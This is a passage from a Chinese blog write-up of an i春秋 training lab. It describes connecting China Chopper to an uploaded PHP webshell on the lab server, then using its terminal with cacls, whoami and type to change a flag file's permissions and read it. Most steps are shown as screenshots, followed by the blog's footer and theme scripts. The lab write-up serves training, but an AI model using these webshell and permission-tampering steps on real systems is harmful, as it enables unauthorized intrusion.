+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/trojan_path.png" alt="trojan_path"></p>
+<p>接着利用菜刀添加SHELL，步骤同上，只不过地址更改为 <code>http://www.test.ichunqiu/uploads/soft/180307/1_1503138291.php</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/add_shell_2.png" alt="add_shell_2"></p>
+<p>若参数设置正确，双击连接服务器的资源管理器，即可进入到木马所上传的目录：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_2.png" alt="manager_2"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进入到管理员桌面可看到 flag 文件 <code>flag~ichunqiu.txt</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/manager_flag.png" alt="manager_flag"></p>
+<p>但双击后未显示任何内容，估计是权限受限。接下来可右键点击条目，祭出虚拟终端，即 webshell 的命令行模式：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/chopper_terminal.png" alt="chopper_terminal"></p>
+<p>先切换至管理员桌面，用 <code>cacls</code> 命令查看 flag 文件的<a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8" target="_blank" rel="external">访问控制列表（ACL）</a>，后用 <code>whoami</code> 命令查看用户名，发现 <code>authority\system</code> 用户对于 flag 文件的权限是 N，即无权限，用 <code>type</code> 命令查看 flag 文件果然是拒绝访问的：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/deny.png" alt="deny"></p>
+<p>用 <code>cacls</code> 命令更改了访问权限后，<code>authority\system</code> 用户对于 flag 文件的权限变成了 F，即所有权限，再次查看 flag 文件内容即可看到 <code>key{il2o3l}</code>：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/flag.png" alt="flag"></p>
+<p>注意提交答案的时候有个坑，记得先拆掉包装，只需提交 <code>il2o3l</code> 即可。最后附上 <code>cacls</code> 命令的用法：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%9C%9F%E7%9A%84%E5%BE%88%E7%AE%80%E5%8D%95/cacls.png" alt="cacls"></p>
+<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>所谓条条大路通罗马，以上思路可能只是完成目标的其中一种方法。本人能力有限，面对工具箱中种类繁多的各种工具不能信手拈来，对于 Windows 命令的使用也掌握不深，尤其是实验手册中提到的 <code>net.exe</code> 工具尚未使用，因为在 webshell 中使用 <code>net</code> 命令也是拒绝访问的，这个问题还请各位前辈不吝赐教。</p>
+<p>最后向以下两篇参考 writeup 的作者表示致谢！</p>
+<blockquote>
+<p><a href="https://bbs.ichunqiu.com/thread-19282-1-1.html" target="_blank" rel="external">09-在线挑战详细攻略-《真的很简单》</a><br><a href="https://bbs.ichunqiu.com/thread-15780-1-1.html" target="_blank" rel="external">爱春秋-WEB渗透实验-真的很简单-实验记录</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/">【i春秋】渗透测试入门 —— 真的很简单</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Cipher Saw 的个人博客">Cipher Saw</a></p>
+  <p><span>发布时间:</span>2018年03月06日 - 15:03</p>
+  <p><span>最后更新:</span>2019年05月02日 - 09:05</p>
+  <p><span>原始链接:</span><a href="/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/" title="【i春秋】渗透测试入门 —— 真的很简单">https://ciphersaw.github.io/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://ciphersaw.github.io/2018/03/06/【i春秋】渗透测试入门 —— 真的很简单/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> </p>  
+  <p>转载请保留原文链接及作者，谢谢！</p>
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/i春秋/" rel="tag"># i春秋</a>
+          
+            <a href="/tags/Crypto/" rel="tag"># Crypto</a>
+          
+            <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+          
+            <a href="/tags/Exploit/" rel="tag"># Exploit</a>
+          
+            <a href="/tags/CMS/" rel="tag"># CMS</a>
+          
+            <a href="/tags/Trojan/" rel="tag"># Trojan</a>
+          
+            <a href="/tags/Vulnerability/" rel="tag"># Vulnerability</a>
+          
+            <a href="/tags/Privilege/" rel="tag"># Privilege</a>
+          
+            <a href="/tags/CMD/" rel="tag"># CMD</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/03/【Bugku CTF】 Web —— welcome to bugkuctf/" rel="next" title="【Bugku CTF】 Web —— welcome to bugkuctf">
+                <i class="fa fa-chevron-left"></i> 【Bugku CTF】 Web —— welcome to bugkuctf
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/08/【i春秋】渗透测试入门 —— 你是会员吗？/" rel="prev" title="【i春秋】渗透测试入门 —— 你是会员吗？">
+                【i春秋】渗透测试入门 —— 你是会员吗？ <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjUyNS85MDg2"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/avatar.jpg"
+              alt="Cipher Saw" />
+          
+            <p class="site-author-name" itemprop="name">Cipher Saw</p>
+            <p class="site-description motion-element" itemprop="description">Not to be whom you don't want to be.</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/ciphersaw" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/CipherSaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" target="_blank">CTF Wiki</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.owasp.org/index.php/Main_Page" title="OWASP" target="_blank">OWASP</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.pentest-standard.org/index.php/Main_Page" title="Pentest Standard" target="_blank">Pentest Standard</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-网站管理员的密码是多少？"><span class="nav-text">0x01 网站管理员的密码是多少？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-网站后台目录名是什么？"><span class="nav-text">0x02 网站后台目录名是什么？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-管理员桌面中-flag-文件信息是？"><span class="nav-text">0x03 管理员桌面中 flag 文件信息是？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取-webshell"><span class="nav-text">获取 webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#直接修改模板-PHP-源码"><span class="nav-text">直接修改模板 PHP 源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传一句话木马文件"><span class="nav-text">上传一句话木马文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#权限提升"><span class="nav-text">权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-小结"><span class="nav-text">0x04 小结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-space-shuttle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cipher Saw</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" href="https://hexo.io">Hexo</a></div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.2</div>
+
+
+        
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63761272";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KWe6NtO4vhgQR3IfB99JElre-gzGzoHsz", "7nrrRDyHHUMcx03upUALYKIQ");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  <script type="text/javascript" src="https://tajs.qq.com/stats?sId=63761272" charset="UTF-8"></script>
+</body>
+</html>
